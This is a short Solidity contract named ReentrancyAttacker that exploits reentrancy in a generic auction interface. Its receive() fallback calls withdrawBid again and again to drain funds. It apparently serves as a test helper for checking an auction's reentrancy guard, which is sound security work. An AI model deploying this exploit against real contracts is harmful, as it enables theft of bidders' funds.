// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function placeBid(uint256 auctionId) external payable;
    function withdrawBid(uint256 auctionId) external;
}

contract ReentrancyAttacker {
    IAuction public auction;
    uint256 public targetAuctionId;
    bool public attackInProgress;

    constructor(address auctionAddress) {
        auction = IAuction(auctionAddress);
    }

    function placeAttackBid(uint256 auctionId) external payable {
        auction.placeBid{value: msg.value}(auctionId);
    }

    function attackWithdraw(uint256 auctionId) external {
        targetAuctionId = auctionId;
        attackInProgress = true;
        auction.withdrawBid(auctionId);
        attackInProgress = false;
    }

    receive() external payable {
        if (attackInProgress) {
            auction.withdrawBid(targetAuctionId);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}